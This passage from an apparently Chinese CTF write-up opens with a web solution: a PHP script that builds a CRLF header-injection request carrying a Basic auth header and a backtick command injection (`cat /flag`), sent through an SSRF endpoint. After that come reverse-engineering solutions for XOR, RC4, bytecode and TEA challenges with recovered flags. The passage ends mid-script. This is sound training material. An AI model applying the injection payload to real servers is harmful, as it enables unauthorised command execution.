class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1/calculator.php&#x27;</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;expression=`cat /flag`&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;Authorization: Basic YWFhYWFhYWFhYWFhZG1pbjppX3dhbnRfdG9fZ2V0STAwX2luTXlUM3N0&#x27;</span></span><br><span class="line">    );</span><br><span class="line"><span class="variable">$aaa</span> = <span class="string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>.(<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&#x27;%0d%0a&#x27;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;%20&#x27;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;%26&#x27;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$aaa</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发送POST请求：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/h4d333333.php?location=http://127.0.0.1/calculator.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>80-21b464e7-4ccf-4895-803d-98e820b7e112.challenge.ctfplus.cn</span><br><span class="line"></span><br><span class="line"><span class="language-llvm">user<span class="operator">=</span>wupco<span class="variable">%0</span>d<span class="variable">%0</span>aContent-Type:<span class="variable">%20</span>application/<span class="keyword">x</span>-www-form-urlencoded<span class="variable">%0</span>d<span class="variable">%0</span>aAuthorization:<span class="variable">%20</span>Basic<span class="variable">%20</span>YWFhYWFhYWFhYWFhZG<span class="number">1</span>pbjppX<span class="number">3</span>dhbnRfdG<span class="number">9</span>fZ<span class="number">2</span>V<span class="number">0</span>STAwX<span class="number">2</span>luTXlUM<span class="number">3</span>N<span class="number">0</span><span class="variable">%0</span>d<span class="variable">%0</span>aContent-Length:<span class="variable">%2022</span><span class="variable">%0</span>d<span class="variable">%0</span>a<span class="variable">%0</span>d<span class="variable">%0</span>aexpression<span class="operator">=</span>`cat<span class="variable">%20</span>/flag`</span></span><br></pre></td></tr></table></figure><p>最后访问 <code>/result</code> 下载得到flag。</p><p>​    </p><h2 id="Reverse-1"><a href="#Reverse-1" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="长颈鹿喜欢吃彩虹"><a href="#长颈鹿喜欢吃彩虹" class="headerlink" title="长颈鹿喜欢吃彩虹"></a>长颈鹿喜欢吃彩虹</h3><blockquote><p>长颈鹿想吃彩虹了，可以帮他它长高吃到彩虹吗，它肯定会给你彩虹糖的</p></blockquote><p>ollvm，动调得到key和密文后，发现是一个简单的异或逻辑，逆：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">k = <span class="string">b&#x27;BOb0m0oN&#x27;</span></span><br><span class="line">c = [<span class="number">0x1D</span>, <span class="number">0x36</span>, <span class="number">0x73</span>, <span class="number">0x16</span>, <span class="number">0x49</span>, <span class="number">0x2D</span>, <span class="number">0x1A</span>, <span class="number">0x1D</span>, <span class="number">0x29</span>, <span class="number">0x06</span>, </span><br><span class="line">  <span class="number">0x42</span>, <span class="number">0x2C</span>, <span class="number">0x76</span>, <span class="number">0x07</span>, <span class="number">0x10</span>, <span class="number">0x0E</span>, <span class="number">0x7E</span>, <span class="number">0x39</span>, <span class="number">0x55</span>, <span class="number">0x32</span>, </span><br><span class="line">  <span class="number">0x75</span>, <span class="number">0x03</span>, <span class="number">0x1B</span>, <span class="number">0x1D</span>, <span class="number">0x19</span>, <span class="number">0x5F</span>, <span class="number">0x52</span>, <span class="number">0x23</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, </span><br><span class="line">  <span class="number">0x1D</span>, <span class="number">0x3F</span>][::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">flag = [c[i]^k[i%<span class="built_in">len</span>(k)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c))]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag[::-<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;yOU_girAFe_L0Ve_EaT_W0bN1aR&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="奇怪的RC4"><a href="#奇怪的RC4" class="headerlink" title="奇怪的RC4"></a>奇怪的RC4</h3><blockquote><p>指令敲一次？不！敲两次！</p></blockquote><p>python解包+pyc反编译，得到源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Rc4 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor1</span>(<span class="params">plaintext, xor_list</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        xor_list = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> xor_list]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        plaintext = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> plaintext]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plaintext)):</span><br><span class="line">        plaintext[i] ^= xor_list[i]</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor2</span>(<span class="params">plaintext</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        plaintext = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> plaintext]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plaintext) - <span class="number">1</span>):</span><br><span class="line">        plaintext[i + <span class="number">1</span>] = plaintext[i] ^ plaintext[i + <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">plaintext, key, xor_list</span>):</span><br><span class="line">    plaintext = rc4(plaintext, key)</span><br><span class="line">    plaintext = xor1(plaintext, xor_list)</span><br><span class="line">    plaintext = xor2(plaintext)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line">plaintext = <span class="built_in">input</span>(<span class="string">&#x27;please give your input:&#x27;</span>)</span><br><span class="line">key = <span class="string">&#x27;SYCFOREVER&#x27;</span></span><br><span class="line">xor_list = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="built_in">len</span>(plaintext)))</span><br><span class="line">cipher = [<span class="number">158</span>, <span class="number">31</span>, <span class="number">205</span>, <span class="number">434</span>, <span class="number">354</span>, <span class="number">15</span>, <span class="number">383</span>, <span class="number">298</span>, <span class="number">304</span>, <span class="number">351</span>, <span class="number">465</span>, <span class="number">312</span>, <span class="number">261</span>, <span class="number">442</span>, <span class="number">397</span>, <span class="number">474</span>, <span class="number">310</span>, <span class="number">397</span>, <span class="number">31</span>, <span class="number">21</span>, <span class="number">78</span>, <span class="number">67</span>, <span class="number">47</span>, <span class="number">133</span>, <span class="number">168</span>, <span class="number">48</span>, <span class="number">153</span>, <span class="number">99</span>, <span class="number">103</span>, <span class="number">204</span>, <span class="number">137</span>, <span class="number">29</span>, <span class="number">22</span>, <span class="number">13</span>, <span class="number">228</span>, <span class="number">3</span>, <span class="number">136</span>, <span class="number">141</span>, <span class="number">248</span>, <span class="number">124</span>, <span class="number">26</span>, <span class="number">26</span>, <span class="number">65</span>, <span class="number">200</span>, <span class="number">7</span>]</span><br><span class="line">plaintext = enc(plaintext, key, xor_list)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">    <span class="keyword">if</span> cipher[i] != plaintext[i]:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Wrong&#x27;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;You know the flag!!&#x27;</span>)</span><br></pre></td></tr></table></figure><p>再反编译 <code>Rc.pyc</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">KSA</span>(<span class="params">key</span>):</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    key_length = <span class="built_in">len</span>(key)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + key[i % key_length]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = (S[j], S[i])</span><br><span class="line">    <span class="keyword">return</span> S</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PRGA</span>(<span class="params">S</span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = (S[j], S[i])</span><br><span class="line">        k = (S[i] + S[j]) % <span class="number">256</span></span><br><span class="line">        <span class="keyword">yield</span> k</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4</span>(<span class="params">plaintext, key</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        key = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> key]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        plaintext = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> plaintext]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plaintext)):</span><br><span class="line">        plaintext[i] += i</span><br><span class="line">    S = KSA(key)</span><br><span class="line">    xor_value = PRGA(S)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plaintext)):</span><br><span class="line">        plaintext[i] ^= <span class="built_in">int</span>(<span class="built_in">next</span>(xor_value)) + <span class="number">6</span></span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br></pre></td></tr></table></figure><p>根据逻辑逆：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = [<span class="number">158</span>, <span class="number">31</span>, <span class="number">205</span>, <span class="number">434</span>, <span class="number">354</span>, <span class="number">15</span>, <span class="number">383</span>, <span class="number">298</span>, <span class="number">304</span>, <span class="number">351</span>, <span class="number">465</span>, <span class="number">312</span>, <span class="number">261</span>, <span class="number">442</span>, <span class="number">397</span>, <span class="number">474</span>, <span class="number">310</span>, <span class="number">397</span>, <span class="number">31</span>, <span class="number">21</span>, <span class="number">78</span>, <span class="number">67</span>, <span class="number">47</span>, <span class="number">133</span>, <span class="number">168</span>, <span class="number">48</span>, <span class="number">153</span>, <span class="number">99</span>, <span class="number">103</span>, <span class="number">204</span>, <span class="number">137</span>, <span class="number">29</span>, <span class="number">22</span>, <span class="number">13</span>, <span class="number">228</span>, <span class="number">3</span>, <span class="number">136</span>, <span class="number">141</span>, <span class="number">248</span>, <span class="number">124</span>, <span class="number">26</span>, <span class="number">26</span>, <span class="number">65</span>, <span class="number">200</span>, <span class="number">7</span>]</span><br><span class="line">xor_list = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="built_in">len</span>(c)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)-<span class="number">2</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    c[i+<span class="number">1</span>] ^= c[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">    c[i] ^= xor_list[i]</span><br><span class="line"></span><br><span class="line">N = <span class="number">256</span></span><br><span class="line">S = [<span class="number">0</span>] * N</span><br><span class="line">key = <span class="string">&#x27;SYCFOREVER&#x27;</span></span><br><span class="line">Key = [<span class="number">0</span>] * N</span><br><span class="line"></span><br><span class="line">t = c[:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">S[i] = i</span><br><span class="line">Key[i] = <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])</span><br><span class="line"></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">j = (j + S[i] + Key[i]) % N</span><br><span class="line">S[i], S[j] = S[j], S[i]</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(t)):</span><br><span class="line">i = (i + <span class="number">1</span>) % N</span><br><span class="line">j = (j + S[i]) % N</span><br><span class="line">S[i], S[j] = S[j], S[i]</span><br><span class="line">t[k] ^= (S[i] + S[j]) % N + <span class="number">6</span></span><br><span class="line"></span><br><span class="line">t = [t[i]-i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(t))]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(t))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;Bel1eve_thAt_you_a3e_Unique_@nd_tHe_beSt&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="好像是python？"><a href="#好像是python？" class="headerlink" title="好像是python？"></a>好像是python？</h3><blockquote><p>Gir@ffe乱用python命令，得到了一个奇怪的文件，你能分析出完整逻辑吗？</p></blockquote><p>python字节码，扔给gpt还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 初始标识设置</span></span><br><span class="line">flag = <span class="string">&#x27;SYC&#123;MD5(input)&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 提示用户输入</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Please input0:&#x27;</span>)</span><br><span class="line">input0 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义函数 test2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test2</span>(<span class="params">s2</span>):</span><br><span class="line">    key = <span class="string">&#x27;SYC&#x27;</span></span><br><span class="line">    length = <span class="number">18</span></span><br><span class="line">    cipher = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        <span class="comment"># 对每个字符进行 XOR 和其他变换</span></span><br><span class="line">        cipher.append(</span><br><span class="line">            (<span class="built_in">ord</span>(s2[i]) ^ i) + ~<span class="built_in">ord</span>(key[i % <span class="number">3</span>]) + <span class="number">1</span></span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义函数 test</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">s, R</span>):</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="comment"># 判断并转换大写字母</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;A&#x27;</span> &lt;= i &lt;= <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">            result.append(<span class="built_in">chr</span>((<span class="built_in">ord</span>(i) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) + R) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)))</span><br><span class="line">        <span class="comment"># 判断并转换小写字母</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;a&#x27;</span> &lt;= i &lt;= <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">            result.append(<span class="built_in">chr</span>((<span class="built_in">ord</span>(i) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + R) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)))</span><br><span class="line">        <span class="comment"># 判断并转换数字</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;0&#x27;</span> &lt;= i &lt;= <span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">            result.append(<span class="built_in">chr</span>((<span class="built_in">ord</span>(i) - <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>) + R) % <span class="number">10</span> + <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>)))</span><br><span class="line">        <span class="comment"># 其他字符不变</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result.append(i)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化变量并进行运算</span></span><br><span class="line">a = <span class="number">13</span></span><br><span class="line">b = <span class="number">14</span></span><br><span class="line">c = (a + b) ^ a</span><br><span class="line">d = b * <span class="number">100</span></span><br><span class="line">e = a ^ b</span><br><span class="line">m = d - c * <span class="number">4</span> + e - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 取模运算</span></span><br><span class="line">r = m % <span class="number">26</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用 test 和 test2 函数</span></span><br><span class="line">cipher1 = test(input0, r)</span><br><span class="line">cipher2 = test2(cipher1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义常量列表</span></span><br><span class="line">num = [-<span class="number">1</span>, -<span class="number">36</span>, <span class="number">26</span>, -<span class="number">5</span>, <span class="number">14</span>, <span class="number">41</span>, <span class="number">6</span>, -<span class="number">9</span>, <span class="number">60</span>, <span class="number">29</span>, -<span class="number">28</span>, <span class="number">17</span>, <span class="number">21</span>, <span class="number">7</span>, <span class="number">35</span>, <span class="number">38</span>, <span class="number">26</span>, <span class="number">48</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证 cipher2 是否与 num 匹配</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">    <span class="keyword">if</span> cipher2[i] != num[i]:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;wrong!&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Rrrright!&#x27;</span>)</span><br></pre></td></tr></table></figure><p>逆：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">deROT</span>(<span class="params">s, R</span>):</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;A&#x27;</span> &lt;= i &lt;= <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">            result.append(<span class="built_in">chr</span>((<span class="built_in">ord</span>(i) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) - R) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)))</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;a&#x27;</span> &lt;= i &lt;= <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">            result.append(<span class="built_in">chr</span>((<span class="built_in">ord</span>(i) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) - R) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)))</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;0&#x27;</span> &lt;= i &lt;= <span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">            result.append(<span class="built_in">chr</span>((<span class="built_in">ord</span>(i) - <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>) - R) % <span class="number">10</span> + <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>)))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result.append(i)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(result)</span><br><span class="line"></span><br><span class="line">c = [-<span class="number">1</span>, -<span class="number">36</span>, <span class="number">26</span>, -<span class="number">5</span>, <span class="number">14</span>, <span class="number">41</span>, <span class="number">6</span>, -<span class="number">9</span>, <span class="number">60</span>, <span class="number">29</span>, -<span class="number">28</span>, <span class="number">17</span>, <span class="number">21</span>, <span class="number">7</span>, <span class="number">35</span>, <span class="number">38</span>, <span class="number">26</span>, <span class="number">48</span>]</span><br><span class="line">r = <span class="number">14</span></span><br><span class="line">key = <span class="string">b&#x27;SYC&#x27;</span></span><br><span class="line">c1 = [(c[i] - ~key[i % <span class="number">3</span>] - <span class="number">1</span>)^i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c))]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(c1))</span><br><span class="line"></span><br><span class="line">c2 = deROT(<span class="built_in">bytes</span>(c1).decode(),r)</span><br><span class="line"><span class="built_in">print</span>(c2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#D0_You_Iik3_python</span></span><br><span class="line"><span class="comment">#SYC&#123;ed798fdd74e5c382b9c7fcca88500aca&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="DH爱喝茶"><a href="#DH爱喝茶" class="headerlink" title="DH爱喝茶"></a>DH爱喝茶</h3><blockquote><p>期待已久的DH终于来到你的家里，你欣喜若狂，但仍需按捺下心思，为DH备好花和茶吧。</p></blockquote><p>除花之后，发现加密逻辑为tea加密，魔改key每次加密时，每个值需要左移6*4位。</p><p>逆：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span 